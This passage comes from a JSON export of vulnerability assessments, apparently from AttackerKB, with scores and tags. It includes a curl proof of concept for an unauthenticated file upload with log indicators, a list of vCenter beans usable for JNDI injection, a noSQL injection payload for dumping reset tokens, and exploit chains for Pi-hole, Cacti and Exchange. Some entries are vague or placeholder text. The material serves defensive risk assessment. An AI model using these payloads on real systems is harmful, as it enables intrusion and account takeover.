{\r\n            logger.info(\"Closing fout\");\r\n            fout.close();\r\n          }\r\n          if (stream != null) {\r\n            logger.info(\"Closing stream\");\r\n            stream.close();\r\n          }\r\n        }\r\n      }\r\n    } catch (Exception ex) {\r\n      out.println(\"{\\\"result\\\": \\\"Upload failed: \" + ex.getMessage() + \"\\\"}\");\r\n      logger.error(\"{\\\"result\\\": \\\"Upload failed: \" + ex.getMessage() + \"\\\"}\");\r\n      logger.error(\"Exception during file upload servlet stream processing: \" + ex);\r\n      response.setStatus(500);\r\n    }\r\n  }\r\n```\r\n\r\n## PoC\r\n\r\n```\r\nwvu@kharak:~$ curl -v http://192.168.123.133/upload -F x=@/dev/null\r\n*   Trying 192.168.123.133...\r\n* TCP_NODELAY set\r\n* Connected to 192.168.123.133 (192.168.123.133) port 80 (#0)\r\n> POST /upload HTTP/1.1\r\n> Host: 192.168.123.133\r\n> User-Agent: curl/7.64.1\r\n> Accept: */*\r\n> Transfer-Encoding: chunked\r\n> Content-Type: multipart/form-data; boundary=------------------------1b9a7fe625152b78\r\n> Expect: 100-continue\r\n>\r\n< HTTP/1.1 100 Continue\r\n* Signaling end of chunked upload via terminating chunk.\r\n< HTTP/1.1 200 OK\r\n< Server: nginx/1.8.1\r\n< Date: Tue, 18 May 2021 01:10:59 GMT\r\n< Content-Type: application/json;charset=ISO-8859-1\r\n< Content-Length: 56\r\n< Connection: keep-alive\r\n< Content-Security-Policy: default-src 'self'; script-src 'self' 'sha256-NqIRKoqKg0DGa/4ZvALvdLDeCWjHxRJAGWG9bR7oqhg='; img-src 'self'; style-src 'self' 'sha256-+iKfdo1l+xjgkzhMgz1wtLzCQP0aDTXicQujdoPsGrM='; font-src 'self' 'sha256-+iKfdo1l+xjgkzhMgz1wtLzCQP0aDTXicQujdoPsGrM='; frame-src 'self'; frame-ancestors 'self'; object-src 'none'; connect-src 'self'\r\n< X-Content-Type-Options: nosniff\r\n< X-XSS-Protection: 1; mode=block\r\n<\r\n{\"result\": \"filename: /var/www/localhost/images//null\"}\r\n* Connection #0 to host 192.168.123.133 left intact\r\n* Closing connection 0\r\nwvu@kharak:~$\r\n```\r\n\r\n```\r\nroot@HyperFlex-Installer-4.0.2d:~# ls -l /var/www/localhost/images/null\r\n-rw-r--r-- 1 tomcat7 tomcat7 0 May 17 18:10 /var/www/localhost/images/null\r\nroot@HyperFlex-Installer-4.0.2d:~#\r\n```\r\n\r\n## IOCs\r\n\r\n```\r\n==> /var/log/nginx/access.log <==\r\n192.168.123.1 - - [17/May/2021:18:10:59 -0700] \"POST /upload HTTP/1.1\" 200 81 \"-\" \"curl/7.64.1\"\r\n\r\n==> /var/log/springpath/stBootstrapGuiBackend.log <==\r\n2021-05-18-01:10:59.568 [tomcat-http-2] DEBUG c.s.sysmgmt.service.StorvisorFileUploader.doPost():74 - {\"result\": \"filename: /var/www/localhost/images//null\"}\r\n2021-05-18-01:10:59.568 [tomcat-http-2] INFO  c.s.sysmgmt.service.StorvisorFileUploader.doPost():81 - Closing fout\r\n2021-05-18-01:10:59.568 [tomcat-http-2] INFO  c.s.sysmgmt.service.StorvisorFileUploader.doPost():85 - Closing stream\r\n\r\n==> /var/log/tomcat7/catalina.out <==\r\n2021-05-18-01:10:59.568 DEBUG com.storvisor.sysmgmt.service.StorvisorFileUploader:74 - {\"result\": \"filename: /var/www/localhost/images//null\"}\r\n2021-05-18-01:10:59.568 INFO  com.storvisor.sysmgmt.service.StorvisorFileUploader:81 - Closing fout\r\n2021-05-18-01:10:59.568 INFO  com.storvisor.sysmgmt.service.StorvisorFileUploader:85 - Closing stream\r\n\r\n==> /var/log/tomcat7/localhost_access_log.2021-05-17.txt <==\r\n127.0.0.1 - - [17/May/2021:18:10:59 -0700] \"POST /upload HTTP/1.0\" 200 56\r\n```",
      "score": 3,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "780d1127-b2d0-40f7-86b8-ebeba802a3e1",
      "editorId": "fa96d8a3-beca-48e6-a2f7-6ead2d5582dd",
      "topicId": "baaffd25-660e-40c6-8978-dd33365e66b6",
      "created": "2021-05-18T22:52:40.285542Z",
      "revisionDate": "2021-05-20T13:22:24.134122Z",
      "document": "Attackers are able to sniff traffic from the incoming lan connection while using a MITM attack or a man in the browser attack. It seems more like a man in the lower attack because it will be as if two users are sending cmds to the same device at the same time. Over time what will happen is the attacker will lock down the access point, harden it then set your browser and internet access to a guest connection. You are able to login in to your router but not actually make changes.. For example I could logon to the router at 192.168.1.1 configure it then connect remotely to it and it would connect to the same port only the ip would be 162.244.6.18. The router of in use doesn't have WIFI but has an AP controller. Anyone else come across this  .please im all ears. Thanks!",
      "score": 3,
      "metadata": {
        "mitre-tactics": "Credential Access"
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "de5ecae9-4e82-46d3-9c7b-4e56adc104f8",
      "editorId": "fa96d8a3-beca-48e6-a2f7-6ead2d5582dd",
      "topicId": "eff2bde8-13ec-40d1-9f07-6c6ac4806059",
      "created": "2021-05-19T00:50:55.28703Z",
      "revisionDate": "2021-05-19T19:37:46.327938Z",
      "document": "Seems to use Arpa or loopback addresses to change the behavior of the os and the applications. \r\nCertificate changes \r\nRandom files and exes added to the applications list. \r\nFirewall rules change regardless of privilege's\r\nLike the attacker lives inside the computers applications  \r\n",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Defense Evasion"
      },
      "tags": [
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        }
      ]
    },
    {
      "id": "2c978c85-c7b8-4c66-9f7f-3497fcf3a7d4",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "462bb7be-5d1c-4847-ae1a-07b008f34c9d",
      "created": "2021-05-26T17:41:46.086759Z",
      "revisionDate": "2021-06-09T15:12:48.33658Z",
      "document": "If the fast and furious exploitation of [CVE-2021-21972](https://attackerkb.com/topics/lrfxAJ9nhV/vmware-vsphere-client-unauth-remote-code-execution-vulnerability-cve-2021-21972?referrer=21985#rapid7-analysis) earlier this year is any indication, attackers are likely to jump on this latest vCenter Server vulnerability quickly. Exploitation does require network access to port 443, but @hrbrmstr and team already identified thousands of vulnerable vCenter Server instances exposed to the public internet (ouch), and phishing/cred reuse makes relatively easy work for attackers looking for network access. With the prevalence of the ransomware threat to most organizations at the moment, this is one to patch on an emergency basis. We definitely don't recommend waiting for a typical patch cycle here. See the [Rapid7 analysis](https://attackerkb.com/topics/X85GKjaVER/cve-2021-21985#rapid7-analysis) for further info.",
      "score": 2,
      "metadata": {
        "attacker-value": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "1b506e3e-4d20-43f3-a0d2-0232102152c9",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "462bb7be-5d1c-4847-ae1a-07b008f34c9d",
      "created": "2021-05-28T22:35:39.439165Z",
      "revisionDate": "2021-06-29T22:39:13.383615Z",
      "document": "Docked exploitability a point because a valid bean and method must be known. See the [Rapid7 analysis](https://attackerkb.com/topics/X85GKjaVER/cve-2021-21985#rapid7-analysis) for more context.\r\n\r\n**ETA:** Cat's out of the bag. [JNDI injection PoC.](https://www.iswin.org/2021/06/02/Vcenter-Server-CVE-2021-21985-RCE-PAYLOAD/) I've confirmed it works. Here are all the [beans](https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/beans/factory/config/MethodInvokingFactoryBean.html) you can use for this:\r\n\r\n```\r\nvsanCapabilityUtils_setVsanCapabilityCacheManager\r\nvsanFormatUtils_setUserSessionService\r\nvsanProviderUtils_setVmodlHelper\r\nvsanProviderUtils_setVsanServiceFactory\r\nvsanQueryUtil_setDataService\r\nvsanUtils_setMessageBundle\r\nvsphereHealthProviderUtils_setVsphereHealthServiceFactory\r\n```\r\n\r\nFor reference, here are all the registered beans in my environment:\r\n\r\n```\r\nadvancedOptionsService\r\ncapabilityPropertyProviderImpl\r\nceipService\r\nclusterDpConfigService\r\ncnManager\r\ncomputeInventoryService\r\nconfigureClusterService\r\nconfigureStretchedClusterService\r\nconfigureVsanClusterMutationProviderImpl\r\nconnectionRetention\r\ndataAccessController\r\ndataService\r\ndataServiceExtensionRegistry\r\ndatacenterInventoryService\r\ndiskGroupMutationService\r\ndiskManagementService\r\ndpClient\r\ndpFactory\r\nencryptionMutationProvider\r\nencryptionPropertyProvider\r\nexecFactory\r\nexecSettings\r\nguardRailPropertyProviderAdapter\r\nhciClusterService\r\nhealthCheckDelay\r\nhealthCheckTimeout\r\nlegacyVsanObjectVersionProviderImpl\r\nlocalizedMessageBundle\r\nlookupSvcClient\r\nlsFactory\r\nlsLocator\r\nmultiVmRestoreBacking\r\nmvcContentNegotiationManager\r\nmvcCorsConfigurations\r\nmvcHandlerMappingIntrospector\r\nmvcUriComponentsContributor\r\nnetworkInventoryService\r\nnetworkIpConfigProvider\r\nobfuscationController\r\nobfuscationService\r\nobjectReferenceService\r\norg.eclipse.gemini.blueprint.service.exporter.support.OsgiServiceFactoryBean#0\r\norg.eclipse.gemini.blueprint.service.exporter.support.OsgiServiceFactoryBean#1\r\norg.eclipse.gemini.blueprint.service.exporter.support.OsgiServiceFactoryBean#2\r\norg.springframework.context.annotation.internalAsyncAnnotationProcessor\r\norg.springframework.context.annotation.internalAutowiredAnnotationProcessor\r\norg.springframework.context.annotation.internalCommonAnnotationProcessor\r\norg.springframework.context.annotation.internalConfigurationAnnotationProcessor\r\norg.springframework.context.annotation.internalPersistenceAnnotationProcessor\r\norg.springframework.context.annotation.internalRequiredAnnotationProcessor\r\norg.springframework.context.annotation.internalScheduledAnnotationProcessor\r\norg.springframework.context.event.internalEventListenerFactory\r\norg.springframework.context.event.internalEventListenerProcessor\r\norg.springframework.format.support.FormattingConversionServiceFactoryBean#0\r\norg.springframework.web.servlet.handler.BeanNameUrlHandlerMapping\r\norg.springframework.web.servlet.handler.MappedInterceptor#0\r\norg.springframework.web.servlet.mvc.HttpRequestHandlerAdapter\r\norg.springframework.web.servlet.mvc.SimpleControllerHandlerAdapter\r\norg.springframework.web.servlet.mvc.annotation.ResponseStatusExceptionResolver#0\r\norg.springframework.web.servlet.mvc.method.annotation.ExceptionHandlerExceptionResolver#0\r\norg.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter\r\norg.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping\r\norg.springframework.web.servlet.mvc.support.DefaultHandlerExceptionResolver#0\r\norg.springframework.web.servlet.view.ContentNegotiatingViewResolver#0\r\npbmClient\r\npbmDataProviderImpl\r\npbmFactory\r\npermissionService\r\nphysicalDisksService\r\nproactiveTestsService\r\npromoteActionController\r\nproxygenController\r\npurgeInaccessibleVmSwapObjectsProvider\r\nrestoreWorkflowBacking\r\nsessionScheduler\r\nsingleVmRestoreBacking\r\nssoFactory\r\ntaskService\r\nupdateDbService\r\nuserSessionService\r\nvcClient\r\nvcFactory\r\nvcPropertiesFacade\r\nvirtualObjectsDataProtectionController\r\nvirtualObjectsService\r\nvlsiSettingsTemplate\r\nvmConsistencyGroupPropertyProvider\r\nvmDataProtectionPropertyProviderAdapter\r\nvmDataProtectionSummaryController\r\nvmDataProtectionSyncPointsController\r\nvmDiskPlacementProvider\r\nvmFolderInventorySerivce\r\nvmInventoryService\r\nvmodlContext\r\nvmodlHelper\r\nvsanCapabilityCacheManager\r\nvsanCapabilityUtils_setVsanCapabilityCacheManager\r\nvsanClusterPropertyProviderAdapter\r\nvsanClusterPropertyProviderAdapterImpl\r\nvsanComponentsProviderImpl\r\nvsanConfigPropertyProviderAdapter\r\nvsanConfigPropertyProviderAdapterImpl\r\nvsanConfigService\r\nvsanDiskMappingsProvider\r\nvsanDpInventoryHelper\r\nvsanDpServicePitProvider\r\nvsanExecutor\r\nvsanFolderPropertyProviderAdapter\r\nvsanFolderPropertyProviderAdapterImpl\r\nvsanFormatUtils_setUserSessionService\r\nvsanHealthProviderImpl\r\nvsanHealthServiceMutationProviderImpl\r\nvsanHostPropertyProviderAdapter\r\nvsanIscsiInitiatorGroupMutationProviderImpl\r\nvsanIscsiInitiatorGroupPropertyProviderImpl\r\nvsanIscsiMutationProviderImpl\r\nvsanIscsiPropertyProviderImpl\r\nvsanIscsiTargetDataAdapter\r\nvsanIscsiTargetDataAdapterImpl\r\nvsanIscsiTargetMutationProviderImpl\r\nvsanIscsiTargetPropertyProviderImpl\r\nvsanMutationProviderImpl\r\nvsanObjectSystemProvider\r\nvsanPerfDiagnosticProviderImpl\r\nvsanPerfMutationProviderImpl\r\nvsanPerfProviderImpl\r\nvsanPropertyProviderImpl\r\nvsanProviderUtils_setVmodlHelper\r\nvsanProviderUtils_setVsanServiceFactory\r\nvsanQueryUtil_setDataService\r\nvsanResyncingComponentsProvider\r\nvsanResyncingComponentsRetriever\r\nvsanResyncingIscsiTargetComponentsProvider\r\nvsanServiceBundleActivator\r\nvsanServiceFactory\r\nvsanStretchedClusterMutationProviderImpl\r\nvsanStretchedClusterPropertyProviderImpl\r\nvsanSupportMutationProviderImpl\r\nvsanSupportProviderImpl\r\nvsanThreadPoolImpl\r\nvsanUpgradeMutationProviderImpl\r\nvsanUpgradePropertyProviderAdapter\r\nvsanUpgradeProviderImpl\r\nvsanUtils_setMessageBundle\r\nvsanVirtualDisksDataProvider\r\nvsanVirtualObjectsProvider\r\nvsanWorkerThreadFactory\r\nvsphereHealthProviderUtils_setVsphereHealthServiceFactory\r\nvsphereHealthServiceFactory\r\nvsphereHealthThreadPoolImpl\r\nvumLoginService\r\nvumPropertyProviderAdapter\r\nwhatIfPropertyProviderAdapter\r\nwhatIfPropertyProviderImpl\r\nwitnessCandidateInventoryService\r\nwitnessHostsProvider\r\n```\r\n\r\nNote that `methodInput` is still ~~limited~~ somewhat limited by what `ProxygenSerializer` can deserialize, so the JNDI injection via [static method](https://docs.oracle.com/javase/tutorial/jndi/ops/lookup.html) is good for arbitrary method invocation, callback notwithstanding. Jang ([@testanull](https://twitter.com/testanull)) [points out](https://twitter.com/testanull/status/1400724415411748865) that `TypeConverter` can be leveraged to work around this issue. Jang's writeup is [here](https://testbnull.medium.com/a-quick-look-at-cve-2021-21985-vcenter-pre-auth-rce-9ecd459150a5).\r\n\r\n**Update:** A ~~new RCE chain~~ [writeup](http://noahblog.360.cn/vcenter-cve-2021-2021-21985/) involving SSRF has been published [by the original researcher].",
      "score": 3,
      "metadata": {
        "exploitability": 4
      },
      "tags": []
    },
    {
      "id": "c0e16bf4-a914-4521-a203-58d393bac6e9",
      "editorId": "c261a1ff-f67b-4f76-b604-01f7c45f4e5d",
      "topicId": "38a528b1-7f68-45c8-911e-1d3f8dc5edb4",
      "created": "2021-05-29T17:31:23.994217Z",
      "revisionDate": "2021-06-01T19:24:00.337688Z",
      "document": "nnnnnnnnnnnn",
      "score": 0,
      "metadata": {
        "mitre-tactics": "Exfiltration"
      },
      "tags": [
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "0e696d6d-665a-48bd-9636-06d0a3a2a211",
          "name": "Requires elevated access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_elevated_access"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "41f946e5-eb8a-4974-8c34-a444754ca3c1",
      "editorId": "97bf384d-2eca-47f2-b98a-28bc8378baf2",
      "topicId": "4efb7983-d467-4269-b8de-5aa419e4770d",
      "created": "2021-05-31T11:59:17.875401Z",
      "revisionDate": "2021-06-02T22:47:31.335937Z",
      "document": "There are 3 vulnerabilities associated with this CVE, all are priv esc.  All three use the same simple trick to execute while being sent to `sed` from the command line.  `www-data` by default is listed in the `sudoers` file to run `pihole`.\r\n\r\n`removestaticdhcp` command requires `/etc/dnsmasq.d/04-pihole-static-dhcp.conf`, and is exploitable from 3.0-5.2.4.\r\n\r\n`removecustomdns ` command requires `/etc/pihole/custom.list`, and is exploitable from 5.1-5.2.4.\r\n\r\n`removecustomcname` command requires `/etc/dnsmasq.d/05-pihole-custom-cname.conf`, and is exploitable from 5.0-5.2.4.",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 3,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "875597fb-bc24-4bd6-ad41-f928920cc1fe",
      "editorId": "97bf384d-2eca-47f2-b98a-28bc8378baf2",
      "topicId": "f0b54f3f-36ae-4783-a9ed-db9cf828a820",
      "created": "2021-05-31T12:03:41.429168Z",
      "revisionDate": "2021-06-03T16:15:04.593346Z",
      "document": "Authenticated user is able to cause a SQLi in `color.php`.  This can be used to dump user creds by default.  However, it can also be exploited for RCE.  cacti databases the executable for php, and with the SQLi we can change the location to be a command injection.",
      "score": 2,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "6fec0d6c-0cfd-42cf-b72e-df9411fce2d1",
      "editorId": "97bf384d-2eca-47f2-b98a-28bc8378baf2",
      "topicId": "37b7802c-6cee-42d6-84f8-1664f15f6065",
      "created": "2021-05-31T12:07:24.283298Z",
      "revisionDate": "2021-06-03T13:28:37.989683Z",
      "document": "noSQL injection within the `/auth/requestreset` API.  By sending `JSON.generate({ 'user' => { '$func' => 'var_dump' } })` it causes the `var_dump` function to be called, which dumps all memory for the `user` object.  This, in effect, allows for enumerating all usernames on the system.  This can be combined with CVE-2020-35847 to eventually get an RCE.",
      "score": 3,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "d63c88ac-efca-41c8-8024-10b115457f74",
      "editorId": "97bf384d-2eca-47f2-b98a-28bc8378baf2",
      "topicId": "8f063596-7cc9-4f22-a42e-617db4b46e79",
      "created": "2021-05-31T12:11:08.352985Z",
      "revisionDate": "2021-06-03T13:28:49.396586Z",
      "document": "Similar to CVE-2020-35846, this is a noSQL injection using the `var_dump` function to dump all memory for the password reset tokens.  The vulnerability is within the `/auth/requestreset` When combined with CVE-2020-35846, its possible to dump all users and their password reset tokens.  With this, a successful password reset of the admin user is possible.  Once logged in, using the `/accounts/find` API, a command injection vulnerability is achieved although there was no CVE assigned to this.",
      "score": 3,
      "metadata": {},
      "tags": []
    },
    {
      "id": "9df38127-7b60-4a1d-9457-8711307a274d",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "84478bb4-7d6d-43ce-8ef1-9cf669b0a51c",
      "created": "2021-06-03T13:07:43.965536Z",
      "revisionDate": "2021-10-08T14:58:27.3702Z",
      "document": "This vulnerability is a deserialization flaw in Exchange's `MeetingPollProposeOptionsPayload.GetRequests()` method. This method can be triggered with an HTTP request and when issued a specially crafted XML payload, can lead to OS command execution within the context of the `w3wp.exe` process which has SYSTEM level privileges.\r\n\r\nThe XML payload is a .NET serialized object which contains the ObjectDataProvider chain from [YSoSerial.NET](https://github.com/pwntester/ysoserial.net) and the `DataContractSerializer` formatter. The payload needs to be crafted to be compatible with the way in which Exchange deserializes it.\r\n\r\nSince many users have sufficient access to authenticate to Exchange, this could easily be used in conjunction with a phishing or password guessing attack and lead to an initial breach.\r\n\r\nThere was a [blog](https://translate.google.com/translate?hl=en&sl=vi&u=https://testbnull.medium.com/microsoft-exchange-from-deserialization-to-post-auth-rce-cve-2021-28482-e713001d915f&prev=search&pto=aue) detailing this vulnerability and a [PoC](https://gist.github.com/testanull/9ebbd6830f7a501e35e67f2fcaa57bda) written by the same author. The PoC is non-functional without being edited.",
      "score": 3,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 4,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "2f15d593-e6ab-455c-b95e-6e4068a3d658",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "132606cf-7b8c-4ee8-be1c-308811e7b813",
      "created": "2021-06-04T17:25:33.267201Z",
      "revisionDate": "2021-06-04T17:25:33.275625Z",
      "document": "No real details on this at the moment but according to Adobe's website at https://helpx.adobe.com/security/products/acrobat/apsb21-29.html this is a Use-After-Free bug in Adobe Acrobat that leads to remote code execution when opening a PDF. It was anonymously reported and has been reported to be exploited in the wild in limited targeted attacks against Windows users.\r\n\r\nGiven the available information though I would guess that to trigger this vulnerability a user would have to open a PDF containing malicious code in Adobe Acrobat and then the malicious PDF would run some JavaScript or similar to put memory into a stable state such that it would be able to trigger the UAF and gain control of Adobe Acrobat without crashing it.\r\n\r\nGiven Adobe Acrobat is popular though the attacker value for this bug is pretty high, though I did deduct a point if only cause an attacker would still need to convince a user to open the PDF. I also set the exploitability at medium as UAF bugs are not that easy to exploit, however web browsers and PDF readers often provide JavaScript engines that allow attackers to more easily control the state of memory, which can greatly ease the process of exploit development. However without knowing more info its difficult to gauge the level of exploitation difficulty for this specific exploit.",
      "score": 1,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "6ceef1fd-efd6-4ef9-b784-d961bd664851",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "1b7eac94-b37e-4979-a3f3-14c42b528c6b",
      "created": "2021-06-04T17:35:27.658149Z",
      "revisionDate": "2021-06-11T04:09:32.031324Z",
      "document": "A writeup and PoC payload is now available at https://testbnull.medium.com/ph%C3%A2n-t%C3%ADch-l%E1%BB%97-h%E1%BB%95ng-solarwinds-orion-deserialization-to-rce-cve-2021-31474-b31a5f168bf0?source=rss-6ac51190917c------2",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "2cc19df6-9cc6-4be6-a70a-faad01a05110",
      "editorId": "a84e860b-902e-4786-8670-9ef6df8e8815",
      "topicId": "50ec30be-5e8c-4158-8aa0-06397441f8a5",
      "created": "2021-06-09T06:55:40.233633Z",
      "revisionDate": "2021-06-09T06:55:40.235952Z",
      "document": "This vulnerability is abused in an exploitation chain. According to the Microsoft advisory it is abused with [Adobe Acrobat CVE-2021-28550](https://attackerkb.com/topics/6EI6mBj0hQ/cve-2021-28550).\r\n\r\n",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Privilege Escalation"
      },
      "tags": [
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        }
      ]
    },
    {
      "id": "0a457587-725c-4688-a9e1-56bd8838b4ce",
      "editorId": "a84e860b-902e-4786-8670-9ef6df8e8815",
      "topicId": "dbaea288-d224-49e1-877d-628dfd1cf161",
      "created": "2021-06-09T06:57:14.951807Z",
      "revisionDate": "2021-06-09T06:57:14.95335Z",
      "document": "This vulnerability is abused in an exploitation chain. According to the Microsoft advisory it is abused with [Adobe Acrobat CVE-2021-28550](https://attackerkb.com/topics/6EI6mBj0hQ/cve-2021-28550).",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Privilege Escalation"
      },
      "tags": [
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        }
      ]
    },
    {
      "id": "99902c2d-3557-49d3-b3f7-e7770add891c",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "06af540e-3c8a-44e7-9cb1-65398aa456d2",
      "created": "2021-06-09T15:31:59.893793Z",
      "revisionDate": "2021-06-24T00:01:57.716765Z",
